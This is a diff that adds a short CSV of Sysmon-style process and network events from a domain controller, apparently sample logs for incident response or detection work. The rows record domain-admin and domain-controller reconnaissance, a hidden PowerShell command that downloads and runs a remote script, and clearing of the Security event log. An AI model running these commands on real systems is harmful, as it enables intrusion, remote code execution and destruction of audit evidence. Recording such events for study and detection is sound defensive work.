@@ -1,0 +1,6 @@
+UtcTime,EventID,Host,User,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Sha256
+2026-05-01T22:16:09Z,1,AD01,CORP\svc-vpn-backup,C:\Windows\System32\net.exe,"net group ""Domain Admins"" /domain",C:\Windows\System32\cmd.exe,,,
+2026-05-01T22:16:14Z,1,AD01,CORP\svc-vpn-backup,C:\Windows\System32\nltest.exe,nltest /dclist:corp.example,C:\Windows\System32\cmd.exe,,,
+2026-05-01T22:17:02Z,3,AD01,CORP\svc-vpn-backup,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.20.30.15/update.ps1')",C:\Windows\System32\cmd.exe,10.20.30.15,80,7f83b1657ff1fc53b92dc18148a1d65dfa135447
+2026-05-01T22:26:01Z,1,AD01,CORP\adm-backup,C:\Windows\System32\wevtutil.exe,wevtutil cl Security,C:\Windows\System32\cmd.exe,,,
+
